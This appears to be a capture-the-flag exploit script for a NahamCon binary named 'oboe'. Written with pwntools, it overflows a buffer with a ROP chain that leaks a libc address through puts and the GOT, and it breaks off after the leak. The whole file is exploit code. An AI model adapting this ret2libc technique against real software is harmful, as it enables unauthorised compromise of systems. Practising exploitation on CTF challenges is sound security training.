#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("oboe")

local = True 
if local:
    p = process("./oboe")
    gdb.attach(p,'''b*0x080486e5\nc''')
else:
    p = remote('challenge.nahamcon.com', 30557)

elf = context.binary = ELF('./oboe', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def add(protocol, domain, path):
    sla(b'protocol:', protocol)
    sla(b'domain:', domain)
    sla(b'path:', path)

main = 0x080486f5
puts = 0x080483b0
puts_got = 0x804a014
path = b'a'*10
payload = p32(puts) + p32(main) + p32(puts_got) + p32(puts_got) + p32(puts_got)
add(b'a'*64, b'b'*64, path + payload + cyclic(53 - len(payload)))
p.recvuntil(b'aaai\x0a')
Libc_base = int.from_bytes(p.recv(4), 'little') #- 0x73340
log.info('Leak: ' + hex(Libc_base))


'''
'''
p.interactive()